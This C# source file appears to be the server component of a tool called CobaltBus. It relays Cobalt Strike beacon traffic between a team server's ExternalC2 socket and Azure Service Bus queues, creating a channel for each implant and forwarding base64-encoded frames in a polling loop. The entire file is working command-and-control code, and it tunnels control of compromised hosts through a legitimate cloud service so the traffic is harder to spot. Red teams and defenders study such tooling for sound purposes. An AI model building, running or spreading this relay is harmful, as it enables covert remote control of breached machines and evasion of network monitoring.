using CobaltBus.Handlers;
using CobaltBus.Models;
using Microsoft.ServiceBus;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace CobaltBus
{
    class Program
    {
        public static string inboudboundQueueName = "C2";
        public static string outboundQueueName = "BE";
        public static string baseQueueName = "CobaltBus-";
        public static string ExternalC2Port = "4444";
        public static string ExternalC2Ip = "127.0.0.1";
        public static int ExtractId(byte[] frame)
        {
            using (var reader = new BinaryReader(new MemoryStream(frame)))
                return reader.ReadInt32();  
        }
        public static string connectionString = "<change-me>";

        static async Task Main(string[] args)
        {
            var interactive = true;
            ServiceBusEnvironment.SystemConnectivity.Mode = Microsoft.ServiceBus.ConnectivityMode.Https;

            var beaconid = "C2SERVER";
            //Connent to the Cobalt ExternalC2 TCP socket

            var liteDbHandler = new LiteDbHandler("CobaltBus.db");



            //Create a new serviceBusHandler that communicates with the CobaltHandler
            var serviceBusHandler = new ServiceBusHandler(connectionString, baseQueueName, beaconid, liteDbHandler);

            //get the Queues in the servicebus namespace
            var queues = await serviceBusHandler.ListQueues();

            //We we don't have an OrchestrationQueue, create one
            if (!queues.Contains(baseQueueName + inboudboundQueueName) || !queues.Contains(baseQueueName + outboundQueueName))
            {

                await serviceBusHandler.CreateQueue(baseQueueName + inboudboundQueueName);
                await serviceBusHandler.CreateQueue(baseQueueName + outboundQueueName);
            }

            Console.WriteLine("[+] Started ServiceBus listener");
            serviceBusHandler.ReceiveMessagesAsync(baseQueueName);

            var cobaltHandlers = new List<CobaltHandler>() { };

            while (true)
            {
                var messages = liteDbHandler.QueryBeaconMsg().Where(x => !string.IsNullOrEmpty(x.Command)).ToArray();
                var activeBeacons = liteDbHandler.QueryBeacons().Where(x => x.Active).ToArray();
                if (messages.Count() == 0 && interactive)
                {
                    //Let's keep talking to cobalt strike
                    foreach (Beacon beacon in activeBeacons)
                    {

                        var cobaltHandler = cobaltHandlers.Where(x => x.BeaconId.Equals(beacon.BeaconId)).FirstOrDefault();

                        var buffer = Convert.FromBase64String("AA==");
                        cobaltHandler.SendFrame(buffer);


                        var readBuffer = cobaltHandler.ReadFrame();
                        if (readBuffer.Length > 0)
                        {
                            BeaconMsg responseMsg = new BeaconMsg()
                            {
                                To = beacon.BeaconId,
                                From = "C2SERVER",
                                Queue = beacon.Queue
                            };

                            //new data that we need to send
                            //Send that data down to the client

                            responseMsg.Command = "COM";
                            responseMsg.Payload = Convert.ToBase64String(readBuffer);

                            // Console.WriteLine($"[+] {ExtractId(Convert.FromBase64String(responseMsg.Payload))}");
                            await serviceBusHandler.SendMessageAsync(responseMsg.Queue, JsonConvert.SerializeObject(responseMsg));
                        }
                    }
                }



                foreach (var msg in messages)
                {
                    CobaltHandler cobaltHandler = null;

                    //Check if this beacon have an handler
                    var lookupCobaltHandler = cobaltHandlers.Where(x => x.BeaconId.Equals(msg.From)).FirstOrDefault();
                    if (lookupCobaltHandler != null)
                    {

                        cobaltHandler = lookupCobaltHandler;
                    }
                    else if (cobaltHandler == null)
                    {
                        Console.WriteLine($"[+] Setting up an TeamServer for beacon {msg.From}");
                        //If not create a new one
                        var cobaltHandlerTwo = new CobaltHandler(ExternalC2Ip, ExternalC2Port, liteDbHandler, msg.From);

                        Console.WriteLine("[+] Connecting to TeamServer");
                        cobaltHandlerTwo.Connect();


                        cobaltHandlers.Add(cobaltHandlerTwo);

                        cobaltHandler = cobaltHandlerTwo;
                    }


                    //Foreach msg, process it
                    var responseMsg = cobaltHandler.ProcessMessage(msg);

                    //If this is a message to create a channel / response to a init beacon
                    if (responseMsg.Command.Equals("CHANNEL") && responseMsg.Queue.Equals(baseQueueName))
                    {
                        Console.WriteLine($"[+] Creating {responseMsg.Payload}C2");
                        await serviceBusHandler.CreateQueue(responseMsg.Payload + "C2");

                        Console.WriteLine($"[+] Creating {responseMsg.Payload}BE");
                        await serviceBusHandler.CreateQueue(responseMsg.Payload + "BE");

                        var newServiceBusHandler = new ServiceBusHandler(connectionString, responseMsg.Payload, beaconid, liteDbHandler);
                        //Start a response handler for that

                        Console.WriteLine($"[+] Listening on {responseMsg.Payload}C2");
                        newServiceBusHandler.ReceiveMessagesAsync(responseMsg.Payload);



                    }

                    //If any other command, send it down the original queue
                    if (!string.IsNullOrEmpty(responseMsg.Command))
                    {
                        if (interactive)
                        {

                            await serviceBusHandler.SendMessageAsync(responseMsg.Queue, JsonConvert.SerializeObject(responseMsg));
                        }
                        else
                        {
                            if (!responseMsg.Payload.Equals("AA=="))
                            {
                                // Console.WriteLine($"[+] {ExtractId(Convert.FromBase64String(responseMsg.Payload))}");

                                await serviceBusHandler.SendMessageAsync(responseMsg.Queue, JsonConvert.SerializeObject(responseMsg));
                            }
                        }
                    }
                    liteDbHandler.DeleteBeaconMsg(msg);
                }
            }
        }
    }
}

